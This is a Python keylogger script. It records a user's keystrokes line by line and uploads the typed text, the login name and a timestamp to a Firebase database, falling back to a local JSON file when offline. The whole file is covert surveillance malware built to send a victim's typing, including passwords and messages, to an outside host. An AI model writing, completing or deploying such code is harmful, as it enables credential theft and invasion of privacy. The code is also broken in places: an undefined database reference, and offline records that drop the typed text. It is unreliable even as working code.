import keyboard
import os
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
from datetime import datetime
import requests
import json

login_name = os.getlogin()


firebase_cred = {"""Enter your Firebase Credentials"""}


cred = credentials.Certificate(firebase_cred)
firebase_admin.initialize_app(cred, {"""Enter your Database URL"""})



def is_online():
    try:
        # Try to make a request to a known website
        response = requests.get("http://www.google.com", timeout=5)
        return response.status_code == 200
    except requests.ConnectionError:
        return False

while True:
    if is_online():
        # If the device is online, immediately push the data to Firebase
        recorded_events = keyboard.record(until="enter")
        required_text = ''
        current_datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        for event in recorded_events:
            if event.event_type == keyboard.KEY_DOWN:
                required_text += event.name

        ref.push({
            'device_name': login_name,
            'typed_text': required_text,
            'datetime': current_datetime
        })
    else:
        # If the device is offline, store the data locally in a JSON file
        recorded_events = keyboard.record(until="enter")
        required_text = ''
        current_datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = {
            'login_name': login_name,
            'event_name': required_text,
            'datetime': current_datetime
        }

        with open('offline_data.json', 'a') as f:
            json.dump(data, f)
            f.write('\n')
